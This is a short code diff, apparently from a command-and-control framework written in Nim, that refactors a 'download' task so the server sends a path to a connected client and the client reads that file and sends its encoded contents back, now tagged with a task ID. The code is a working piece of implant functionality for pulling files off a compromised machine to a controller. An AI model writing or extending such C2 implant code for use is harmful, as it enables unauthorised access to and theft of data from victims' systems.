@@ -7,18 +7,16 @@ when defined(client):
     import ../client/communication
 
 when defined(server):
-    proc sendTask*(client: C2Client, path: string) {.async.} =
-        let j = %*
+    proc sendTask*(client: C2Client, path: string): Future[Task] {.async.} =
+        return await client.sendClientTask("download", %*
             {
-                "task": "download",
                 "path": path
-            }
-        await client.sendClientTask($j)
+            })
 
 when defined(client):
-    proc executeTask*(client: Socket, path: string) =
+    proc executeTask*(client: Socket, taskId: int, path: string) =
         try:
             let contents: string = readFile(path)
-            client.sendFile(path, encode(contents))
+            client.sendFile(taskId, path, encode(contents))
         except IOError:
-            client.sendOutput("ERR", "File " & path & " does not exist!")
+            client.sendFile(taskId, path, "", "File " & path & " does not exist!")
